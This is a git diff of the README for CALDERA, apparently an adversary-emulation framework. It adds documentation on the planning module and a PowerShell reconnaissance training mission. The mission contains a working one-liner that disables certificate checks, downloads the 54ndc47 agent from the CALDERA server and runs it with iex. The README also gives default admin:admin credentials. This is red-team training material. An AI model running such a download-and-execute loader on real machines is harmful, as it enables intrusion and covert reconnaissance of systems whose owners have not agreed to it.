@@ -52,22 +52,22 @@ CALDERA is built using a plugin architecture on top of the core system (this rep
 software components that plug new features and behavior into the core system. Plugins reside
 in the plugins/ directory. For more information on each one, refer to their respective README files.
 
-### How to load a plugin
-
 Load plugins into the core system by listing them in the conf/local.yml file, then restart
-CALDERA for them to become available:
-```
-plugins:
-  - gui
-  - chain
-  - stockpile
-  - sandcat
-```
+CALDERA for them to become available.
+
+## Planning
+
+When running an operation, CALDERA hooks in a planning module, which determines which order to run each ability. 
+An operation executes abilities within phases, but if there are multiple abilities in a phase, the planning module
+determines which to run first. The planning module can be changed in the configuration file, local.yml.
 
 ## Getting started
 
 To understand CALDERA, it helps to run an operation. Below are pre-built missions you can follow
 along with to understand the system. These missions will assume CALDERA is running locally on a laptop.
+
+*Extra credit: go to https://localhost:8888 in a browser, logging in with the credentials admin:admin, and 
+click into the Chain mode plugin. Can you see how you'd manage an operation from the GUI?*
 
 ### Mission #1: OSX reconnaissance
 
@@ -122,10 +122,25 @@ monitor >>> op 1
 ```
 
 Once the operation is complete, compare the execution time of the first and last commands. Was
-the mission a success? Did the mission1 adversary run without a trace? 
+the mission a success? Did the mission1 adversary run without a trace? Can you figure out why the 
+abilities are being run in the order they are?
 
-*Extra credit: go to https://localhost:8888 in a browser, logging in with the credentials admin:admin, and 
-click into the Chain mode plugin. Can you see how you'd manage an operation from the GUI?*
+### Mission #2: PowerShell reconnaissance
+
+*This mission requires PowerShell 3.0+ and is compatible with the open-source version.*
+
+> Perform reconnaissance on a compromised Windows laptop. Your employer needs a list of all processes running
+ on the machine, so make sure this is fetched first. Then perform other recon abilities and get out
+ before you get caught. 
+
+Perform the same steps as mission #1 - with the exception of:
+
+1. Start a PowerShell version of 54ndc47, instead of a bash one
+```
+$url="https://localhost:8888/file/render?group=client"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);}
+```
+
+2. Run the mission2 adversary, instead of mission1
 
 ## Developers
 
